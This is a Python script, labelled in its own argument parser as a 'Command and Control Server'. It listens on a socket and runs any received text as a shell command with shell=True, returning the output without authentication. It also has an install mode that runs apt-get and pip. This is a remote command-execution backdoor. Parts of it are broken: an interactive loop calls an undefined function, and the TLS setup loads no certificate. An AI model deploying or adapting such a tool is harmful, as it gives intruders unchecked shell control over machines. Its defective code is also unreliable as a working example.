import argparse
import logging
import ssl
import subprocess
import socket
import threading
import os

IP = '127.0.0.1'
PORT = 8080
COMMAND_HISTORY_FILE = 'command_history.txt'

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class CommandServer:
    def __init__(self):
        self.server_socket = None
        self.command_history = []

    def start(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.bind((IP, PORT))
            self.server_socket.listen(5)
            logger.info(f"Listening on {IP}:{PORT}")

            while True:
                try:
                    client_socket, addr = self.server_socket.accept()
                    logger.info(f"Got connection from {addr}")
                    client_thread = threading.Thread(target=self.handle_client, args=(client_socket, addr))
                    client_thread.start()
                except Exception as e:
                    logger.error(f"Error accepting connection: {str(e)}")
        except KeyboardInterrupt:
            logger.info("Server stopped by user.")
        finally:
            if self.server_socket:
                self.server_socket.close()

    def handle_client(self, client_socket, addr):
        try:
            context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            client_socket = context.wrap_socket(client_socket, server_side=True)

            while True:
                try:
                    command = client_socket.recv(1024).decode('utf-8')
                    if command.lower() == 'exit':
                        break
                    output = self.execute_command(command)
                    client_socket.send(output.encode('utf-8'))
                except UnicodeDecodeError:
                    logger.error("Error decoding received data.")
                    break
        except Exception as e:
            logger.error(f"Error handling connection from {addr}: {str(e)}")
        finally:
            client_socket.close()
            logger.info(f"Connection from {addr} closed.")

    def execute_command(self, command):
        try:
            output = subprocess.check_output(command, shell=True, timeout=10)
            decoded_output = output.decode('utf-8')
            self.command_history.append(command)
            self.save_command_history()
            return decoded_output
        except subprocess.CalledProcessError as e:
            return f"Error: {e.returncode}\n{e.output.decode('utf-8')}"
        except subprocess.TimeoutExpired:
            return "Error: Command execution timed out."
        except Exception as e:
            return f"Error: {str(e)}"

    def save_command_history(self):
        with open(COMMAND_HISTORY_FILE, 'w') as history_file:
            history_file.write('\n'.join(self.command_history[-50:]))

def install_dependencies():
    subprocess.check_output("apt-get install python3 python3-pip -y", shell=True)
    subprocess.check_output("pip3 install requests", shell=True)

def command_loop():
    try:
        import readline  # Enable command history and line editing
        if os.path.exists(COMMAND_HISTORY_FILE):
            readline.read_history_file(COMMAND_HISTORY_FILE)
    except ImportError:
        logger.warning("Module 'readline' not available. Command history and line editing will not work.")

    try:
        while True:
            command = input('command> ')
            if command.lower() == 'exit':
                break
            output = execute_command(command)
            print(output)
    except KeyboardInterrupt:
        pass
    finally:
        try:
            readline.write_history_file(COMMAND_HISTORY_FILE)
        except NameError:
            pass  # Ignore if readline is not available

def main():
    parser = argparse.ArgumentParser(description="Command and Control Server")
    parser.add_argument('command', choices=['install', 'command_loop', 'server_loop'], help="Specify command to execute")
    args = parser.parse_args()

    if args.command == 'install':
        install_dependencies()
    elif args.command == 'command_loop':
        command_loop()
    elif args.command == 'server_loop':
        command_server = CommandServer()
        command_server.start()
    else:
        print("Invalid command. Please use 'install', 'command_loop', or 'server_loop'.")

if __name__ == '__main__':
    main()
